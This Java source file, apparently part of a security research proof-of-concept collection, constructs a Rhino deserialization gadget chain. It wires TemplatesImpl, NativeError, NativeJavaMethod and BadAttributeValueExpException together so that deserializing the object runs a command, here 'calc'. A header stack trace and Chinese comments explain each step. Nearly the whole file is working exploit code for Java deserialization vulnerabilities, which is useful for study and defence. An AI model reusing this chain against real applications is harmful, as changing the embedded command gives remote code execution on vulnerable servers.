package com.javasec.pocs.rhino;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.mozilla.javascript.*;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * exec:347, Runtime (java.lang)
 * <init>:-1, a
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:442, Class (java.lang)
 * getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invoke:161, MemberBox (org.mozilla.javascript)
 * call:247, NativeJavaMethod (org.mozilla.javascript)
 * getImpl:2024, ScriptableObject (org.mozilla.javascript)
 * get:287, ScriptableObject (org.mozilla.javascript)
 * get:387, IdScriptableObject (org.mozilla.javascript)
 * getProperty:1617, ScriptableObject (org.mozilla.javascript)
 * getString:198, NativeError (org.mozilla.javascript)
 * js_toString:150, NativeError (org.mozilla.javascript)
 * toString:110, NativeError (org.mozilla.javascript)
 * readObject:86, BadAttributeValueExpException (javax.management)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:64, SerializeUtils (com.javasec.utils)
 * deserTester:309, SerializeUtils (com.javasec.utils)
 * main:51, rhino1 (com.javasec.pocs.rhino)
 */
public class rhino1 {
    public static void main(String[] args) throws  Exception{
        Templates templates = SerializeUtils.getTemplate("calc");

        // 实例化 NativeError 类
        Scriptable nativeError = (Scriptable) SerializeUtils.newInstance("org.mozilla.javascript.NativeError");
        // 使用恶意类 TemplatesImpl 初始化 NativeJavaObject
        // 这样 unwrap 时会返回 tmpl 实例
        // 由于 NativeJavaObject 序列化时会调用 initMembers() 方法
        // 所以需要在实例化 NativeJavaObject 时也进行相关初始化
        Context context          = Context.enter();
        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();
        NativeJavaObject nativeJavaObject = new NativeJavaObject(scriptableObject, templates, TemplatesImpl.class);

        // 使用 newTransformer 的 Method 对象实例化 NativeJavaMethod 类
        Method newTransformer   = TemplatesImpl.class.getDeclaredMethod("newTransformer");
        NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformer, "name");

        // 使用反射将 nativeJavaObject 写入到 NativeJavaMethod 实例的 prototypeObject 中
        Field prototypeField = ScriptableObject.class.getDeclaredField("prototypeObject");
        prototypeField.setAccessible(true);
        prototypeField.set(nativeError, nativeJavaObject);
        // 将 GetterSlot 放入到 NativeError 的 slots 中
        Method getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", String.class, int.class, int.class);
        getSlot.setAccessible(true);
        Object slotObject = getSlot.invoke(nativeError, "name", 0, 4);
        // 反射将 NativeJavaMethod 实例放到 GetterSlot 的 getter 里
        // ysoserial 调用了 setGetterOrSetter 方法，我这里直接反射写进去，道理都一样
        Class<?> getterSlotClass = Class.forName("org.mozilla.javascript.ScriptableObject$GetterSlot");
        Field    getterField     = getterSlotClass.getDeclaredField("getter");
        getterField.setAccessible(true);
        getterField.set(slotObject, nativeJavaMethod);
        // 生成 BadAttributeValueExpException 实例，用于反序列化触发 toString 方法
        BadAttributeValueExpException exception = new BadAttributeValueExpException("su18");
        SerializeUtils.setFieldValue(exception,"val",nativeError);
        SerializeUtils.deserTester(exception);
    }
}

